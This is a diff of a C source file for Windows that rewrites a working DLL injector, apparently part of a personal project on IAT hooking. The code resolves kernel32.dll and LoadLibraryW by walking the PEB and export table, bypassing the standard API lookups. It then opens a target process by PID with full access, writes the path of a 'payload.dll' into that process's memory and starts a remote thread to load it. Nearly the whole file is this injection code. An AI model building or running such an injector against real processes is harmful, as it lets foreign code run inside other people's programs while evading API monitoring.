@@ -1,13 +1,12 @@
 #include <windows.h>
 #include <winternl.h>
-#include <tlhelp32.h>
 #include <stdio.h>
+#include <stdlib.h>
 
 #define WHITE 0x7
 #define GREEN 0x2
 #define RED 0x4
 #define PE_SIGNATURE 0x4550
-
 
 PPEB getPEB() {
     return (PPEB)__readgsqword(0x60);  // For x64
@@ -20,7 +19,6 @@ void setColor(WORD color) {
 
 //* Custom implementation of GetModuleHandleA
 PVOID getModuleBase(wchar_t *moduleName) {
-    //? Go through PEB structure to reach the module list
     PPEB pPeb = getPEB();
     PEB_LDR_DATA *Ldr = pPeb->Ldr;
     
@@ -32,22 +30,14 @@ PVOID getModuleBase(wchar_t *moduleName) {
 
     UNICODE_STRING *modName = (UNICODE_STRING *)((ULONG_PTR)firstEntry + 0x58); // BaseDllName
 
-    //? First module is the executable the process was launched from
     if (moduleName == NULL) {
-        setColor(GREEN);
-        printf("\n[+] Found %ls!\n", modName->Buffer);
-        setColor(WHITE);
         return *(PVOID*)((ULONG_PTR)firstEntry + 0x30); // DllBase
     }
 
     //? Loop through InMemoryOrderModuleList until you find the correct module
     do {
         if (_wcsicmp(modName->Buffer, moduleName) == 0) {
-            PVOID imageBase = *(PVOID*)((ULONG_PTR)currentEntry + 0x30); // DllBase
-            setColor(GREEN);
-            printf("\n[+] Found %ls!\n", modName->Buffer);
-            setColor(WHITE);
-            return imageBase;
+            return *(PVOID*)((ULONG_PTR)currentEntry + 0x30); // DllBase
         }
         //? move to next one
         currentFlink = currentFlink->Flink;
@@ -64,7 +54,6 @@ PVOID getModuleBase(wchar_t *moduleName) {
 
 //* Custom implementation of GetProcAddress
 PVOID getFuncAddress(PVOID moduleBase, LPCSTR funcName) {
-    printf("[i] Getting address of %s...\n", funcName);
     //? Parse PE headers located at moduleBase in memory, to get the Export Address Table
     PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)moduleBase;
     PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)moduleBase + dosHeaders->e_lfanew);
@@ -74,7 +63,6 @@ PVOID getFuncAddress(PVOID moduleBase, LPCSTR funcName) {
         setColor(WHITE);
         return NULL;
     }
-    printf("[i] PE file signature: %#X\n", ntHeaders->Signature);
 
     PIMAGE_EXPORT_DIRECTORY exportsDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)moduleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
     if (!exportsDirectory) {
@@ -97,112 +85,80 @@ PVOID getFuncAddress(PVOID moduleBase, LPCSTR funcName) {
             //? AddressOf_[n] does not work, have to do it this way
             WORD ordinal = *((WORD*)((ULONG_PTR)AddressOfNameOrdinals + i*sizeof(WORD)));
 			DWORD fRVA = *((DWORD*)((ULONG_PTR)AddressOfFunctions + ordinal*sizeof(DWORD)));
-            setColor(GREEN);
-            printf("\n[+] Found %s!\n\t\\==={ Address: %#X\n", fName, (ULONG_PTR)moduleBase+fRVA);
-            setColor(WHITE);
             return (PVOID)((ULONG_PTR)moduleBase+fRVA);
         }
     }
     return NULL;
 }
 
-HANDLE ProcessEnumerateAndSearch(char* ProcessName) {
-    HANDLE hSnapshot;
-    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) }; // According to documentation the size must be set
-
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        printf("[X] CreateToolhelp32Snapshot has failed with error %d\n", GetLastError());
-        return NULL;
-    }
-
-    if (Process32First(hSnapshot, &pe)) {
-        do {
-            if (strcmp(pe.szExeFile, ProcessName) == 0) {
-                printf("Process PID: %d has been opened\n", pe.th32ProcessID);
-                return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
-            }
-        } while (Process32Next(hSnapshot, &pe));
-    }
-
-    CloseHandle(hSnapshot);
-    return NULL;
-}
-
-BOOL InjectDLL(HANDLE hProcess, PWCHAR dllName) {
+//? Simple DLL injection into specified process. Resolves HANDLE from process ID
+BOOL InjectDLL(int pid, PWCHAR dllName) {
     LPVOID pLibAddr;
     SIZE_T szWrittenBytes;
     HANDLE hThread;    
 
-    // Locating the LoadLibrary DLL
+    //? Get address of LoadLibrary function
+    //? KnownDLLs (like kernel32.dll) have the same address across processes, for memory efficiency.
+    //? You can confirm this fact with Process Hacker or a similar tool. (look at DLL addresses)
     PVOID k32Base = getModuleBase(L"kernel32.dll");
+    setColor(GREEN);
     printf("[+] Got kernel32.dll base: %#X\n", k32Base);
+    setColor(WHITE);
     PVOID pLoadLibrary = getFuncAddress(k32Base, "LoadLibraryW");
     if (pLoadLibrary == NULL) {
+        setColor(RED);
         printf("\n[!] Failed to get LoadLibrary address\n");
+        setColor(WHITE);
         return FALSE;
     }
+    setColor(GREEN);
     printf("[+] Got LoadLibrary address: %#X\n", pLoadLibrary);
+    setColor(WHITE);
 
-    // Allocating memory into the target process
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (hProcess == NULL) {
+        setColor(RED);
+        printf("\n[!] Failed to open process, error code: %#X\n", GetLastError());
+        setColor(WHITE);
+        return FALSE;
+    }
+    //? Allocate memory into the target process for DLL name
     pLibAddr = VirtualAllocEx(hProcess, NULL, (wcslen(dllName)+1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (pLibAddr == NULL) {
+        setColor(RED);
         printf("\n[!] VirtualAllocEX failed: %d\n", GetLastError());
+        setColor(WHITE);
         return FALSE;
     }
     
-    // Writing into the target process the dll payload name
+    //? Write DLL name into the target processes memory space
     if (!WriteProcessMemory(hProcess, pLibAddr, dllName, (wcslen(dllName)+1) * sizeof(WCHAR), &szWrittenBytes)) {
+        setColor(RED);
         printf("\n[!] WriteProcessMemory failed: %d\n", GetLastError());
+        setColor(WHITE);
         return FALSE;
     }
     printf("[i] Wrote %d bytes to remote process\n",  szWrittenBytes);
     
-    // Run a thread into the target process that will load the payload through LoadLibraryW
-
+    //? Create a thread in the remote process, in order to load the DLL
     hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pLibAddr, 0, NULL);
     if (hThread == NULL) {
-        printf("Error in CreateRemoteThread: %d\n", GetLastError());
+        setColor(RED);
+        printf("\n[!] CreateRemoteThread failed: %d\n", GetLastError());
+        setColor(WHITE);
         return FALSE;
     }
-
     return TRUE;
 }
 
-int main(int argc, char **argv) {
-    if (argc < 2) {
-    printf("Usage: %s <input_string>\n", argv[0]);
-    return 1;
-    }
-    // Get the length of argv[1] in characters
-/*    size_t inputLength = strlen(argv[1]);
-
-    // Allocate memory for the wide string (including null terminator)
-    PWCHAR wName = (PWCHAR)malloc((inputLength + 1) * sizeof(WCHAR));
-    if (!wName) {
-        printf("Memory allocation failed\n");
-        return 1;
-    }
-
-    // Convert the input string to wide characters
-    size_t convertedChars = 0;
-    mbstowcs_s(&convertedChars, wName, inputLength + 1, argv[1], _TRUNCATE);
-    wprintf(L"Converted string: %ls\n", wName);
-*/
-    HANDLE hProcess = ProcessEnumerateAndSearch(argv[1]);
- //   free(wName);
-    if (hProcess == NULL) {
-        setColor(RED);
-        printf("\n[!] Failed to get process handle\n");
-        setColor(WHITE);
-        return -1;
-    }
-
-    BOOL ok = InjectDLL(hProcess, L"D:\\koodi\\portfolio\\iathook\\payload.dll");
+int main(int argc, char** argv) {
+    int pid = atoi(argv[1]);
+    printf("pid: %d", pid);
+    BOOL ok = InjectDLL(pid, L"D:\\koodi\\portfolio\\iathook\\payload.dll");
     if (!ok) {
-        printf("\n[!] Failed to inject DLL\n");
+        printf("\n[!] Failed to inject dll");
         return -1;
     }
-
+    printf("[+] Injected DLL");
     return 1;
 }
